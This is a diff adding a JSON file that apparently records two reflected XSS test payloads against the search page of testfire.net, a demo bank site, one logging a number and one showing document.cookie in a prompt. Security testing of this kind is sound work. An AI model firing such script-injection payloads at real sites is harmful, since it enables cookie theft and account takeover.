@@ -1,0 +1,12 @@
+[
+    {
+        "url_xss": "http://testfire.net/search.jsp?query=%3Cscript%3Econsole.log%285000%2F3000%29%3C%2Fscript%3E",
+        "method": "GET",
+        "data": "{'query': '<script>console.log(5000/3000)</script>'}"
+    },
+    {
+        "url_xss": "http://testfire.net/search.jsp?query=%3Cscript%3Eprompt%28document.cookie%29%3C%2Fscript%3E",
+        "method": "GET",
+        "data": "{'query': '<script>prompt(document.cookie)</script>'}"
+    }
+]
